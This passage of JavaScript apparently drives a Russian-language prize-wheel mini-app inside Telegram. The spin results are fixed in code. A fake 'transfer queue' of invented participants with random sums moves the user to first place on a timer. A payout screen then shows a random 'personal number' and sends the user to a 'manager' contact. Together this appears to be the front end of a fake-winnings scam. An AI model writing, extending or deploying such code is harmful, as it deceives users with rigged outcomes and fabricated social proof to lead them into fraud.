    .slice(0, 2)
    .map(normalizePrize);
  return prizes.reduce((sum, prize) => sum + prize.price, 0);
}

function createTransferQueueParticipants() {
  const names = shuffleItems([
    'Алина Ф.',
    'Андрей Г.',
    'Заур Ф.',
    'Анатолий Г.',
    'Милена О.',
    'Григорий С.',
    'Оксана В.',
    'Виктория Р.',
  ]).slice(0, 5);
  const amounts = [314980, 200000, 8000, 96000, 15600, 205000, 128000, 76000];

  return names.map((name, index) => ({
    id: 'queue-person-' + index,
    name,
    amount: amounts[getRandomIndex(amounts.length)],
    isCurrentUser: false,
  })).concat({
    id: 'queue-current-user',
    name: 'Вы',
    amount: getTransferQueueTotal(),
    isCurrentUser: true,
  });
}

function createTransferQueueRow(participant) {
  const row = document.createElement('article');
  row.className = 'transfer-queue-row' + (participant.isCurrentUser ? ' is-current-user' : '');
  row.dataset.queueId = participant.id;
  row.innerHTML =
    '<div class="transfer-queue-person">' +
      '<span class="transfer-queue-avatar" aria-hidden="true">♙</span>' +
      '<strong>' + participant.name + '</strong>' +
    '</div>' +
    '<div class="transfer-queue-value">' +
      '<strong>' + formatPrice(participant.amount) + '</strong>' +
      (participant.isCurrentUser
        ? '<span class="transfer-queue-spinner" role="status" aria-label="Ожидание в очереди"></span>'
        : '') +
    '</div>';
  return row;
}

function updateTransferQueueLayout() {
  transferQueueParticipants.forEach((participant, index) => {
    const row = transferQueueRows.get(participant.id);
    if (row) row.style.transform = `translateY(${index * 51}px)`;
  });
}

function finishTransferQueue() {
  window.clearInterval(transferQueueTimer);
  transferQueueTimer = null;
  appState?.update((state) => {
    state.transferQueue = {
      ...state.transferQueue,
      participants: [...transferQueueParticipants],
      completed: true,
      countdownStartedAt: Date.now(),
    };
  });
  const currentUserRow = transferQueueRows.get('queue-current-user');
  const spinner = currentUserRow?.querySelector('.transfer-queue-spinner');
  if (spinner) {
    spinner.className = 'transfer-queue-check';
    spinner.textContent = '✓';
    spinner.setAttribute('aria-label', 'Вы на первом месте');
  }

  if (!transferQueueCountdown || !transferQueueCountdownValue) return;
  transferQueueCountdown.hidden = false;
  let secondsLeft = 5;
  transferQueueCountdownValue.textContent = secondsLeft + ' сек.';
  window.clearInterval(transferQueueCountdownTimer);
  transferQueueCountdownTimer = window.setInterval(() => {
    secondsLeft -= 1;
    if (secondsLeft > 0) {
      transferQueueCountdownValue.textContent = secondsLeft + ' сек.';
      return;
    }
    window.clearInterval(transferQueueCountdownTimer);
    transferQueueCountdownTimer = null;
    transferQueueCountdownValue.textContent = 'готово';
    showPayoutScreen();
  }, 1000);
}

function showPayoutScreen() {
  if (!payoutScreen || !payoutTotal || !payoutPersonalNumber) return;

  clearWarehouseCheckSequence();
  persistWheelState('payout');

  window.clearInterval(transferQueueTimer);
  window.clearInterval(transferQueueCountdownTimer);
  transferQueueTimer = null;
  transferQueueCountdownTimer = null;
  payoutPersonalNumberValue = String(appState?.get()?.payout?.personalNumber || (10000 + getRandomIndex(90000)));
  appState?.setPayout({ personalNumber: payoutPersonalNumberValue });
  payoutTotal.textContent = formatPrice(getTransferQueueTotal());
  payoutPersonalNumber.textContent = payoutPersonalNumberValue;
  if (payoutCopyLabel) payoutCopyLabel.textContent = 'Нажмите чтобы скопировать';
  payoutPersonalNumberCard?.classList.remove('is-copied');

  winnerScreen.hidden = true;
  warehouseScreen.hidden = true;
  moneyScreen.hidden = true;
  chatScreen.hidden = true;
  transferQueueScreen.hidden = true;
  payoutScreen.removeAttribute('hidden');
  wheelContent?.classList.remove('transfer-queue-mode');
  wheelPage?.classList.remove('transfer-queue-mode');
  wheelContent?.classList.add('payout-mode');
  wheelPage?.classList.add('payout-mode');
  window.scrollTo(0, 0);
}

function copyPayoutPersonalNumber() {
  if (!payoutPersonalNumberValue) return;

  const markAsCopied = () => {
    if (payoutCopyLabel) payoutCopyLabel.textContent = 'Скопировано ✓';
    payoutPersonalNumberCard?.classList.add('is-copied');
  };
  const fallbackCopy = () => {
    const temporaryInput = document.createElement('textarea');
    temporaryInput.value = payoutPersonalNumberValue;
    temporaryInput.setAttribute('readonly', '');
    temporaryInput.style.position = 'fixed';
    temporaryInput.style.opacity = '0';
    document.body.appendChild(temporaryInput);
    temporaryInput.select();
    const copied = document.execCommand('copy');
    temporaryInput.remove();
    if (copied) markAsCopied();
  };

  if (navigator.clipboard?.writeText) {
    navigator.clipboard.writeText(payoutPersonalNumberValue).then(markAsCopied).catch(fallbackCopy);
  } else {
    fallbackCopy();
  }
}

function openManagerContact() {
  if (telegram?.openTelegramLink) {
    telegram.openTelegramLink(managerContactUrl);
    return;
  }
  window.location.href = managerContactUrl;
}

function advanceTransferQueue() {
  const currentUserIndex = transferQueueParticipants.findIndex((participant) => participant.isCurrentUser);
  if (currentUserIndex <= 0) {
    finishTransferQueue();
    return;
  }

  const previousParticipant = transferQueueParticipants[currentUserIndex - 1];
  transferQueueParticipants[currentUserIndex - 1] = transferQueueParticipants[currentUserIndex];
  transferQueueParticipants[currentUserIndex] = previousParticipant;
  appState?.update((state) => {
    state.transferQueue = {
      ...state.transferQueue,
      participants: [...transferQueueParticipants],
    };
  });
  updateTransferQueueLayout();

  if (currentUserIndex - 1 === 0) finishTransferQueue();
}

function showTransferQueueScreen() {
  if (!transferQueueScreen || !transferQueueList) return;

  clearWarehouseCheckSequence();
  persistWheelState('transfer-queue');

  window.clearInterval(transferQueueTimer);
  window.clearInterval(transferQueueCountdownTimer);
  transferQueueTimer = null;
  transferQueueCountdownTimer = null;
  const savedQueue = appState?.get()?.transferQueue || {};
  transferQueueParticipants = Array.isArray(savedQueue.participants) && savedQueue.participants.length
    ? savedQueue.participants.map((participant) => ({ ...participant }))
    : createTransferQueueParticipants();
  appState?.update((state) => {
    state.transferQueue = {
      ...state.transferQueue,
      participants: [...transferQueueParticipants],
      completed: false,
      countdownStartedAt: null,
    };
  });
  transferQueueRows.clear();
  transferQueueList.innerHTML = '';
  transferQueueCountdown.hidden = true;
  transferQueueCountdownValue.textContent = '5 сек.';

  transferQueueParticipants.forEach((participant) => {
    const row = createTransferQueueRow(participant);
    transferQueueRows.set(participant.id, row);
    transferQueueList.appendChild(row);
  });
  updateTransferQueueLayout();

  winnerScreen.hidden = true;
  warehouseScreen.hidden = true;
  moneyScreen.hidden = true;
  chatScreen.hidden = true;
  transferQueueScreen.removeAttribute('hidden');
  wheelContent?.classList.remove('chat-mode');
  wheelPage?.classList.remove('chat-mode');
  wheelContent?.classList.add('transfer-queue-mode');
  wheelPage?.classList.add('transfer-queue-mode');
  window.scrollTo(0, 0);

  if (savedQueue.completed) {
    finishTransferQueue();
  } else {
    transferQueueTimer = window.setInterval(advanceTransferQueue, 1800);
  }
}

function startBonusRound() {
  bonusRound = true;
  currentSpin = 0;
  bonusNoneSpin = getRandomIndex(totalSpins);
  roundPrizeIds.clear();
  bonusRoundWinnings = [];
  updateSpinProgress();
  spinModal.hidden = true;
  document.body.classList.remove('spin-modal-open');
  wheelAction.disabled = false;
  persistWheelState('wheel', { lastResult: null, lastPrize: null });
  appState?.recordAction('bonus_round_started');
  wheelAction.focus();
}

function spin() {
  if (!wheelTrack || !wheelAction || isSpinning || currentSpin >= totalSpins) return;
  isSpinning = true;
  currentSpin += 1;
  appState?.recordAction('spin_started', {
    round: bonusRound ? 'bonus' : 'initial',
    attempt: currentSpin,
  });
  wheelAction.disabled = true;
  wheelAction.classList.add('is-spinning');
  wheelTrack.querySelectorAll('.wheel-item-active').forEach((item) => item.classList.remove('wheel-item-active'));
  updateSpinProgress();
  telegram?.HapticFeedback?.impactOccurred('medium');

  let key = 'none';
  let prize = null;
  let targetIndex;

  if (bonusRound) {
    const isBonusNone = currentSpin - 1 === bonusNoneSpin;
    if (!isBonusNone) prize = getRandomPrize();
    ensureTrackCapacity(currentTrackIndex + 10);
    targetIndex = getTargetIndex(isBonusNone ? 'none' : prize.id, currentTrackIndex + 10);
  } else {
    const targetPrizeId = currentSpin === totalSpins ? 'reload' : 'none';
    targetIndex = getTargetIndex(targetPrizeId, currentTrackIndex + 10);
  }

  const landedItem = wheelTrack.children[targetIndex];
  const landedPrizeId = landedItem?.dataset.prize;
  if (bonusRound) prize = prizePool.find((entry) => entry.id === landedPrizeId) || null;
  key = landedPrizeId === 'reload' ? 'reload' : 'none';
  currentTrackIndex = targetIndex;
  // Save the in-flight attempt before the animation starts so a quick
  // re-entry cannot roll the user back to the previous attempt.
  persistWheelState('wheel');
  wheelTrack.style.transform = `translateX(${getOffsetForIndex(targetIndex)}px)`;

  window.setTimeout(() => {
    isSpinning = false;
    wheelAction.classList.remove('is-spinning');
    wheelAction.disabled = currentSpin >= totalSpins;
    telegram?.HapticFeedback?.notificationOccurred('success');
    if (prize) {
      const savedPrize = saveWinnings(prize);
      if (bonusRound) {
        bonusRoundWinnings.push(savedPrize);
        if (bonusRoundWinnings.length >= 2) {
          persistWheelState('winner');
          showWinnerScreen();
        } else {
          showPrizeResult(prize);
        }
      } else {
        showPrizeResult(prize);
      }
    } else {
      showResult(key);
    }
  }, 3900);
}

if (wheelTrack) {
  baseWheelItems = [...wheelTrack.children];
  appendTrackCopies(8);
  setInitialPosition(currentTrackIndex);
  window.addEventListener('resize', () => setInitialPosition(currentTrackIndex));
}

updateSpinProgress();
if (wheelAction) wheelAction.disabled = currentSpin >= totalSpins;

wheelAction?.addEventListener('click', spin);
claimGoods?.addEventListener('click', () => {
  appState?.recordAction('warehouse_selected');
  showWarehouseScreen({ startFresh: true });
});
claimMoney?.addEventListener('click', () => {
  appState?.recordAction('money_exchange_selected');
  showMoneyScreen();
});
warehouseClaimMoney?.addEventListener('click', () => {
  appState?.recordAction('money_exchange_selected');
  showMoneyScreen();
});
moneyOpenChat?.addEventListener('click', showChatScreen);
chatActions?.addEventListener('click', (event) => {
  if (event.target.closest('.chat-next-button')) {
    appState?.recordAction('chat_next_clicked');
    showTransferQueueScreen();
  }
});
payoutContactManager?.addEventListener('click', () => {
  appState?.recordAction('manager_contact_opened');
  openManagerContact();
});
payoutPersonalNumberCard?.addEventListener('click', copyPayoutPersonalNumber);

spinAgain?.addEventListener('click', () => {
  if (!bonusRound && currentSpin >= totalSpins) {
    startBonusRound();
    return;
  }

  if (bonusRound && currentSpin >= totalSpins) {
    showWinnerScreen();
    return;
  }

  spinModal.hidden = true;
  document.body.classList.remove('spin-modal-open');
  wheelAction.disabled = false;
  persistWheelState('wheel', { lastResult: null, lastPrize: null });
  appState?.recordAction('spin_result_closed');
  wheelAction.focus();
});

function restoreSavedScreen() {
  const route = appState?.get()?.route;
  if (!route || route.page !== 'index3') return;

  if (route.screen === 'spin-result') {
    if (savedWheel.lastPrize) {
      showPrizeResult(savedWheel.lastPrize);
    } else if (savedWheel.lastResult) {
      showResult(savedWheel.lastResult);
    }
    return;
  }

  if (route.screen === 'winner') return showWinnerScreen();
  if (route.screen === 'warehouse') return showWarehouseScreen();
  if (route.screen === 'money') return showMoneyScreen();
  if (route.screen === 'chat') return showChatScreen();
  if (route.screen === 'transfer-queue') return showTransferQueueScreen();
  if (route.screen === 'payout') return showPayoutScreen();
}

restoreSavedScreen();
